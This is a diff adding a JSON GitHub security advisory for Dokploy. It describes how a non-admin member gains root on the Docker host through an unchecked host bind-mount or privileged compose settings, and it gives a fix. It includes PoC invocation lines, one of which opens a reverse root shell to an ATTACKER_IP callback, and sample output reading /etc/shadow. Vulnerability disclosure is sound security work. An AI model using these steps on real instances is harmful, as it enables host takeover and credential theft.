@@ -1,0 +1,47 @@
+{
+  "global": null,
+  "id": "GHSA-jrg5-2gj5-h827",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-269",
+      "CWE-862"
+    ],
+    "description": "### Summary\r\nA low-privilege organization member can get root on the Docker host that runs Dokploy. A member who can create a service, but who is denied Docker access (`canAccessToDocker = false`) and has no SSH or Traefik access, can attach a host bind-mount (`type: \"bind\"`, `hostPath: \"/\"`) to its own service and deploy it. The resulting container runs as `uid=0(root)` with the entire host filesystem mounted read-write. The `mounts.create` endpoint checks only whether the member may create volumes and manage the service. It does not check whether the member may mount host paths into the container.\r\n\r\n### Details\r\nDokploy defines each tRPC route using a procedure type (`apps/dokploy/server/api/trpc.ts`). A `protectedProcedure` is available to any authenticated user, including a `member`, while an `adminProcedure` requires an owner or admin. Members also have permission flags such as `canCreateServices`, `canAccessToDocker`, and `canAccessToSSHKeys`. Dokploy checks these flags on routes that expose the corresponding features.\r\n\r\n`mounts.create` is a `protectedProcedure`. Before creating the mount, it calls `checkServicePermissionAndAccess` (`apps/dokploy/server/api/routers/mount.ts:77`):\r\n\r\n```ts\r\ncreate: protectedProcedure.input(apiCreateMount).mutation(async ({ input, ctx }) => {\r\n    await checkServicePermissionAndAccess(ctx, input.serviceId, { /* ... */ });\r\n    const mount = await createMount(input);\r\n});\r\n```\r\n\r\n`checkServicePermissionAndAccess` (`packages/server/src/services/permission.ts:242`) checks the generic `volume:create` permission and whether the member has access to the service. It does not distinguish a Docker-managed volume from a bind-mount of an arbitrary host path. The base member role has `volume:create` permission for services it can access. A member with `canCreateServices` is also automatically granted access to each service it creates, so it passes both checks. The mount schema (`packages/server/src/db/schema/mount.ts`) does not restrict the mount type or host path:\r\n\r\n```ts\r\ntype: z.enum([\"bind\", \"volume\", \"file\"]),\r\nhostPath: z.string().optional(),\r\n```\r\n\r\nThe member can therefore create a mount with `type: \"bind\"` and `hostPath: \"/\"`. When the service is deployed, Dokploy adds it to the Swarm service as `type=bind src=/ dst=/host ro=false`. The container runs as root with the host filesystem mounted read-write at `/host`. It can read or modify any host file, including `/etc/shadow` and `/var/run/docker.sock`. Either the writable host filesystem or access to the Docker socket is enough to take full control of the host. This path never checks whether the member has Docker, SSH, or Traefik access.\r\n\r\nThe `compose` router has the same problem. `compose.create` checks whether the member may create a service in the project. `compose.update` and `compose.deploy` check whether the member may manage that compose service. These routes do not inspect the submitted `composeFile` for settings that expose the host. A member can use `privileged: true`, `/:/host`, or a Docker-socket mount to get the same result. This was also confirmed on a live instance (`../pocs/compose_chain.py`).\r\n\r\nFix: require a separate permission for container settings that expose the host. For callers who are not owners or admins, reject `type: \"bind\"` and any `hostPath` unless the caller has permission to create host mounts. Apply this check to both `mounts.create` and `mounts.update`. Dokploy should also parse compose files before they are created, updated, or deployed. Unless the caller has the required permission, reject host bind-mounts, Docker-socket mounts, `privileged`, added capabilities, host namespaces, devices, and similar settings. Client-side controls and the generic `volume:create` permission are not sufficient.\r\n\r\n### PoC\r\n\r\n[poc.py](https://github.com/user-attachments/files/28923031/poc.py) (Python 3, standard library only) reproduces the full attack against an instance you own. It bootstraps or signs in as the owner, creates a low-privilege member (`canCreateServices = true`, `canAccessToDocker = false`, no SSH or Traefik access), and then switches to that member. Before continuing, it confirms that Dokploy denies the member's direct request to list Docker containers. The member then creates a project and application, attaches the host bind-mount, selects the Alpine image, and deploys the application.\r\n\r\n\r\n```\r\n# fresh instance (bootstraps the owner, then runs the member exploit):\r\npython3 poc.py --url http://127.0.0.1:3000\r\n\r\n# existing instance (supply an owner/admin to set the member up):\r\npython3 poc.py --url http://HOST:3000 --owner-email admin@example.com --owner-pass '...'\r\n\r\n# optional: open an interactive root shell on the Docker host:\r\npython3 poc.py --url http://127.0.0.1:3000 --shell\r\n\r\n# specify the callback address when it cannot be detected automatically:\r\npython3 poc.py --url http://HOST:3000 --shell --callback-host ATTACKER_IP\r\n```\r\n\r\n`mounts.create` accepts the host-root bind-mount for the non-admin member, and the deployed container writes proof to the host's `/tmp`:\r\n\r\n```\r\n$ cat /tmp/dokploy_privesc_poc_<token>\r\nhost-exec chroot /host cat /etc/hostname: <host hostname>\r\nhost-read /etc/os-release: PRETTY_NAME=\"...\"     # the host OS, read through the mount\r\nhost-read /etc/shadow: root:...                  # a root-only host file\r\nhost-write /tmp: token <token>                   # this file, written to the host\r\n```\r\n\r\nA container deployed by a member with no Docker access used `chroot` to run the host's `/bin/cat`, read files that normally require root access, and wrote a file to the host. This confirms that `/host` is the host's root filesystem. The attack does not depend on `chroot`: the container already has read-write access to the host filesystem and Docker socket.\r\n\r\nBy default, the PoC is non-destructive. It writes one marker file and reads `/etc/os-release` and the first line of `/etc/shadow`. With `--shell`, it starts a local listener and uses the same bind-mount to open an interactive root shell in the host filesystem. Typing `exit` closes the shell and allows the PoC to remove the temporary application, project, and member. The marker file remains under `/tmp` for inspection.\r\n\r\n### Impact\r\nThis authorization failure allows a low-privilege account to take full control of the host. Any Dokploy installation that allows a non-admin member to create or manage services is affected. The member can read and modify any host file, access the Docker socket, and run commands as root. From there, the member can take over every other organization, project, and service on the instance. Disabling Docker, SSH, and Traefik access for the member does not prevent the attack. The issue is confirmed on `v0.29.8`, and the same vulnerable code remains in the public `canary` branch as of June 13, 2026.",
+    "ghsa_id": "GHSA-jrg5-2gj5-h827",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-jrg5-2gj5-h827",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-jrg5-2gj5-h827"
+      }
+    ],
+    "published_at": "2026-11-12T08:17:17Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Non-admin organisation member can gain root on the host via an unrestricted host bind-mount",
+    "updated_at": "2026-11-12T08:17:17Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
